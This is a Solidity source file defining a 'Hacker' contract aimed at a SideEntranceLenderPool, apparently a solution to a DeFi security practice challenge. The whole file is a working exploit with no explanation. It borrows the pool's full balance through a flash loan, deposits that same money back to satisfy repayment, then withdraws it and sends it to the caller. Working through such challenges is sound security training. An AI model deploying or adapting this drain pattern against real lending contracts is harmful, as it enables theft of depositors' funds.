pragma solidity 0.8.17;

import "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";



contract Hacker {

    SideEntranceLenderPool pool;

    bool public receivedMoney;
    address payable owner;


    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function launchAttack() external {
        owner = payable(msg.sender);
        uint poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
    }

    fallback() external payable {
        // require(owner != address(0));

        if(!receivedMoney) {
            receivedMoney = true;
            pool.deposit{value: msg.value}();
        } else {
        (bool success, ) = owner.call{value: msg.value}("");
        require(success, "Cound't send the funds");
        }
    }

    receive() external payable {}
}